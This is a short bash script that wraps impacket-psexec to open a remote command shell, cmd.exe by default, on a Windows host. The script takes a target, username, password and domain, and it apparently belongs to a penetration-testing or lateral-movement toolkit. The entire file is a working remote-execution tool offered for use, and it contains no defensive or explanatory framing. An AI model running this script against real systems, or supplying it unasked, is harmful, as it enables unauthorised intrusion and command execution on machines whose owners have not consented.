#!/bin/bash
# Get shell via PsExec (requires valid creds)

TARGET="$1"
USER="$2"
PASS="$3"
DOMAIN="${4:-WORKGROUP}"
COMMAND="${5:-cmd.exe}"

if [ -z "$TARGET" ] || [ -z "$USER" ] || [ -z "$PASS" ]; then
    echo "Usage: psexec_shell.sh <target> <user> <pass> [domain] [command]"
    exit 1
fi

echo "[*] PsExec to $TARGET as $DOMAIN\\$USER"

impacket-psexec "$DOMAIN/$USER:$PASS@$TARGET" "$COMMAND" 2>&1
